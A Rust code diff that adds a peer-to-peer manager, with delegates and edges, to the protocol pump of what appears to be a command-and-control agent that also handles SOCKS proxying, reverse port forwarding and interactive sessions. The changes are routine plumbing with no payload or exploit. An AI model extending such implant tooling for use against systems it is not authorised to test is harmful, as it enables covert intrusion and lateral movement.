@@ -12,6 +12,7 @@ use crate::DEBUG;
 use crate::auxiliary::AuxiliaryManager;
 use crate::dispatch;
 use crate::interactive::InteractiveManager;
+use crate::p2p::P2pManager;
 use crate::rpfwd::RpfwdManager;
 use crate::socks::SocksManager;
 use crate::streams::StreamDriver;
@@ -35,6 +36,7 @@ pub struct ProtocolPump {
     socks: SocksManager,
     rpfwd: RpfwdManager,
     interactive: InteractiveManager,
+    p2p: P2pManager,
     auxiliary: AuxiliaryManager,
 }
 
@@ -45,6 +47,7 @@ impl ProtocolPump {
             socks: SocksManager::new(),
             rpfwd: RpfwdManager::new(),
             interactive: InteractiveManager::new(),
+            p2p: P2pManager::new(),
             auxiliary: AuxiliaryManager::new(),
         }
     }
@@ -65,6 +68,7 @@ impl ProtocolPump {
         StreamDriver::wants_fast_poll(&self.socks)
             || StreamDriver::wants_fast_poll(&self.rpfwd)
             || StreamDriver::wants_fast_poll(&self.interactive)
+            || self.p2p.wants_fast_poll()
             || self.auxiliary.wants_fast_poll()
     }
 
@@ -78,8 +82,11 @@ impl ProtocolPump {
             socks: StreamDriver::drain_outbound(&mut self.socks),
             rpfwd: StreamDriver::drain_outbound(&mut self.rpfwd),
             interactive: StreamDriver::drain_outbound(&mut self.interactive),
+            delegates: self.p2p.drain_delegates(),
+            edges: self.p2p.drain_edges(),
             ..Default::default()
         };
+        shared.alerts.extend(self.p2p.drain_alerts());
         self.auxiliary.drain_into(&mut shared);
         shared
     }
@@ -89,12 +96,15 @@ impl ProtocolPump {
         StreamDriver::handle_inbound(&mut self.socks, extras.socks);
         StreamDriver::handle_inbound(&mut self.rpfwd, extras.rpfwd);
         StreamDriver::handle_inbound(&mut self.interactive, extras.interactive);
+        self.p2p.handle_inbound(extras.delegates);
     }
 
     pub fn requeue_shared(&mut self, shared: AgentExtras) {
         StreamDriver::requeue_outbound_front(&mut self.socks, shared.socks);
         StreamDriver::requeue_outbound_front(&mut self.rpfwd, shared.rpfwd);
         StreamDriver::requeue_outbound_front(&mut self.interactive, shared.interactive);
+        self.p2p.requeue_delegates_front(shared.delegates);
+        self.p2p.requeue_edges_front(shared.edges);
         self.auxiliary.requeue_alerts_front(shared.alerts);
     }
 
@@ -123,6 +133,8 @@ impl ProtocolPump {
             && shared.socks.is_empty()
             && shared.rpfwd.is_empty()
             && shared.interactive.is_empty()
+            && shared.delegates.is_empty()
+            && shared.edges.is_empty()
             && shared.alerts.is_empty()
         {
             return Ok(());
